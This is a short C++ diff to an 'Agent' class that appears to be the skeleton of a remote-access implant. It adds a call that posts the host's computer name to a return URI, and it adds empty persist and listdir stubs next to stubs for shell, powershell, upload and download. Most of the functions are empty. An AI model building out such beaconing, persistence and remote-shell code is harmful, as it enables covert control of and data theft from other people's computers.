@@ -10,6 +10,8 @@ void Agent::Register(std::string ip, unsigned int port) {
 		throw std::runtime_error("Something went wrong.");
 	ComputerName = std::string{ buffer };
 
+
+	Post(RETURN_URI, "?comp=" + ComputerName);
 }
 
 
@@ -48,9 +50,6 @@ void Agent::shell(std::vector<std::string> args) {
 		return;
 	}
 
-
-
-
 	HANDLE hRead, hWrite;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi = { 0 };
@@ -76,21 +75,20 @@ void Agent::shell(std::vector<std::string> args) {
 	}
 
 
-
-
 }
-
 
 void Agent::powershell(std::vector<std::string> args) {
 
 }
-
 void Agent::upload(std::vector<std::string> args) {
 
 }
-
 void Agent::download(std::vector<std::string> args) {
 
 }
+void Agent::persist(std::vector<std::string> args) {
 
-//void Agent::ListDirectory() {}
+}
+void Agent::listdir(std::vector<std::string> args) {
+
+}
